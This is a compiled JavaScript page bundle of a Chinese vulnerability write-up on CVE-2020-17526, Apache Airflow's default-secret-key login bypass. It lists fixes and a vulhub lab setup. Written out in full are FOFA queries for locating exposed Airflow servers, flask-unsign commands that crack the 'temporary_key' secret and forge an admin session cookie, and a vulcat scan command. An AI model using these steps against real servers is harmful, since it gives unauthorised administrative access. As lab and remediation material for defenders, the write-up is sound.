(window.webpackJsonp=window.webpackJsonp||[]).push([[23],{335:function(s,a,t){"use strict";t.r(a);var e=t(7),r=Object(e.a)({},(function(){var s=this,a=s._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h1",{attrs:{id:"💛-apache-airflow-默认密钥导致的权限绕过"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#💛-apache-airflow-默认密钥导致的权限绕过"}},[s._v("#")]),s._v(" 💛 Apache Airflow 默认密钥导致的权限绕过")]),s._v(" "),a("h2",{attrs:{id:"_1-漏洞信息"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_1-漏洞信息"}},[s._v("#")]),s._v(" 1）漏洞信息")]),s._v(" "),a("table",[a("thead",[a("tr",[a("th",[s._v("漏洞名称")]),s._v(" "),a("th",[s._v("受影响组件")]),s._v(" "),a("th",[s._v("漏洞类型")]),s._v(" "),a("th",[s._v("漏洞编号")])])]),s._v(" "),a("tbody",[a("tr",[a("td",[s._v("Apache Airflow未授权访问"),a("br"),a("br"),s._v("Apache Airflow默认密钥漏洞")]),s._v(" "),a("td",[a("a",{attrs:{href:"https://airflow.apache.org/",target:"_blank",rel:"noopener noreferrer"}},[s._v("ApacheAirflow"),a("OutboundLink")],1)]),s._v(" "),a("td",[s._v("未授权访问")]),s._v(" "),a("td",[a("a",{attrs:{href:"https://nvd.nist.gov/vuln/detail/CVE-2020-17526",target:"_blank",rel:"noopener noreferrer"}},[s._v("CVE-2020-17526"),a("OutboundLink")],1)])])])]),s._v(" "),a("table",[a("thead",[a("tr",[a("th",[s._v("漏洞简介")])])]),s._v(" "),a("tbody",[a("tr",[a("td",[s._v("Apache Airflow是一款开源的，分布式任务调度框架。"),a("br"),s._v("默认情况下，Apache Airflow无需用户认证，但管理员也可以通过指定webserver.authenticate=True来开启认证。"),a("br"),a("br"),s._v("在其1.10.13版本及以前，即使开启了认证，攻击者也可以通过一个默认密钥来绕过登录，伪造任意用户。")])])])]),s._v(" "),a("table",[a("thead",[a("tr",[a("th",[s._v("参考链接")])])]),s._v(" "),a("tbody",[a("tr",[a("td",[a("ol",[a("li",[a("a",{attrs:{href:"https://vulhub.org/#/environments/airflow/CVE-2020-17526/",target:"_blank",rel:"noopener noreferrer"}},[s._v("https://vulhub.org/#/environments/airflow/CVE-2020-17526/"),a("OutboundLink")],1)])])])])])]),s._v(" "),a("table",[a("thead",[a("tr",[a("th",[s._v("补丁及修复方案")])])]),s._v(" "),a("tbody",[a("tr",[a("td",[a("ol",[a("li",[s._v("修改[webserver] secret_key默认配置（修改默认密钥）")]),a("li",[s._v("更新至最新版本："),a("a",{attrs:{href:"https://github.com/apache/airflow",target:"_blank",rel:"noopener noreferrer"}},[s._v("https://github.com/apache/airflow"),a("OutboundLink")],1)])])])])])]),s._v(" "),a("table",[a("thead",[a("tr",[a("th",[s._v("网络空间测绘")])])]),s._v(" "),a("tbody",[a("tr",[a("td",[s._v("FOFA："),a("code",[s._v('title="Airflow - Login"')])])]),s._v(" "),a("tr",[a("td",[s._v("FOFA："),a("code",[s._v('body="<h1 class=\\"text-center login-title\\">Sign in to Airflow'),s._v('"')])])]),s._v(" "),a("tr",[a("td",[s._v("FOFA："),a("code",[s._v('icon_hash="-1625254865"')])])])])]),s._v(" "),a("h2",{attrs:{id:"_2-漏洞环境"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_2-漏洞环境"}},[s._v("#")]),s._v(" 2）漏洞环境")]),s._v(" "),a("p",[s._v("使用"),a("a",{attrs:{href:"https://github.com/vulhub/vulhub",target:"_blank",rel:"noopener noreferrer"}},[s._v("vulhub"),a("OutboundLink")],1),s._v("搭建漏洞环境")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("git clone https://github.com/vulhub/vulhub\ncd vulhub/airflow/CVE-2020-17526\ndocker-compose up -d\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[s._v("启动容器后，访问8080端口即可看到Airflow登录页面")]),s._v(" "),a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/vuepress/static/imgs/docs/vuln-db/apache-airflow/cve-2020-17526/01.png",alt:""}}),s._v(" "),a("h2",{attrs:{id:"_3-漏洞复现-手工"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_3-漏洞复现-手工"}},[s._v("#")]),s._v(" 3）漏洞复现-手工")]),s._v(" "),a("p",[s._v("开启 BurpSuite 和代理，刷新登录页面，查看Response")]),s._v(" "),a("p",[s._v("可以看到应用程序返回了Set-Cookie")]),s._v(" "),a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/vuepress/static/imgs/docs/vuln-db/apache-airflow/cve-2020-17526/02.png",alt:""}}),s._v(" "),a("p",[s._v("运行pip安装辅助工具"),a("code",[s._v("flask-unsign")])]),s._v(" "),a("div",{staticClass:"language-shell line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-shell"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# ！注意！我们需要的是命令行工具")]),s._v("\npip3 "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("install")]),s._v(" flask-unsign           "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 这个是安装源代码")]),s._v("\npip3 "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("install")]),s._v(" flask-unsign"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("wordlist"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 这个是安装命令行工具")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 卸载命令行工具")]),s._v("\npip3 uninstall flask-unsign-wordlist\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br")])]),a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/vuepress/static/imgs/docs/vuln-db/apache-airflow/cve-2020-17526/03.png",alt:""}}),s._v(" "),a("p",[s._v("安装完成之后，运行flask-unsign")]),s._v(" "),a("p",[s._v("如果看到工具提示信息，说明安装成功")]),s._v(" "),a("div",{staticClass:"language-shell line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-shell"}},[a("code",[s._v("flask-unsign\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/vuepress/static/imgs/docs/vuln-db/apache-airflow/cve-2020-17526/04.png",alt:""}}),s._v(" "),a("p",[s._v("运行以下命令，将Set-Cookie中的"),a("code",[s._v("session")]),s._v("参数传递给flask-unsign")]),s._v(" "),a("p",[s._v("flask-unsign会暴破session的加密密钥")]),s._v(" "),a("div",{staticClass:"language-shell line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-shell"}},[a("code",[s._v("flask-unsign "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-u")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-c")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("你的"),a("span",{pre:!0,attrs:{class:"token environment constant"}},[s._v("SESSION")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 例如")]),s._v("\nflask-unsign "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-u")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-c")]),s._v(" eyJfZnJlc2giOmZhbHNlLCJjc3JmX3Rva2VuIjoiNzBhZmJhOGQ5ZmI2MDk5NGI2ZTk1YTkwZGUzYTBmZjE5ODA0YWY5YiJ9.ZAK0kQ.jSWDhcPF-n6f2V10PkCnNFUAekk\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/vuepress/static/imgs/docs/vuln-db/apache-airflow/cve-2020-17526/05.png",alt:""}}),s._v(" "),a("p",[s._v("如果暴破成功，会返回一个字符串")]),s._v(" "),a("p",[s._v("此处发现session的加密密钥为：temporary_key")]),s._v(" "),a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/vuepress/static/imgs/docs/vuln-db/apache-airflow/cve-2020-17526/06.png",alt:""}}),s._v(" "),a("p",[s._v("获得密钥之后，运行以下命令，伪造一个新的session，以便登录Airflow")]),s._v(" "),a("div",{staticClass:"language-shell line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-shell"}},[a("code",[s._v("flask-unsign "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-s")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--secret")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("你的密钥"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-c")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("\"{'user_id': '1', '_fresh': False, '_permanent': True}\"")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 例如")]),s._v("\nflask-unsign "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-s")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--secret")]),s._v(" temporary_key "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-c")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("\"{'user_id': '1', '_fresh': False, '_permanent': True}\"")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/vuepress/static/imgs/docs/vuln-db/apache-airflow/cve-2020-17526/07.png",alt:""}}),s._v(" "),a("p",[s._v("获得伪造的session之后，将其添加到Cookie当中")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("Cookie: session=你伪造的SESSION\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/vuepress/static/imgs/docs/vuln-db/apache-airflow/cve-2020-17526/08.png",alt:""}}),s._v(" "),a("p",[s._v("然后刷新页面，成功进入后台\n"),a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/vuepress/static/imgs/docs/vuln-db/apache-airflow/cve-2020-17526/09.png",alt:""}})]),s._v(" "),a("h2",{attrs:{id:"_4-漏洞复现-vulcat"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_4-漏洞复现-vulcat"}},[s._v("#")]),s._v(" 4）漏洞复现-vulcat")]),s._v(" "),a("div",{staticClass:"language-shell line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-shell"}},[a("code",[s._v("python3 vulcat.py "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-u")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("URL"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-v")]),s._v(" cve-2020-17526\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("如图，vulcat返回了默认密钥 以及 伪造的session")]),s._v(" "),a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/vuepress/static/imgs/docs/vuln-db/apache-airflow/cve-2020-17526/10.png",alt:""}}),s._v(" "),a("p",[s._v("将伪造的session添加到Cookie")]),s._v(" "),a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/vuepress/static/imgs/docs/vuln-db/apache-airflow/cve-2020-17526/11.png",alt:""}}),s._v(" "),a("p",[s._v("刷新页面，成功进入后台")]),s._v(" "),a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/vuepress/static/imgs/docs/vuln-db/apache-airflow/cve-2020-17526/12.png",alt:""}})])}),[],!1,null,null,null);a.default=r.exports}}]);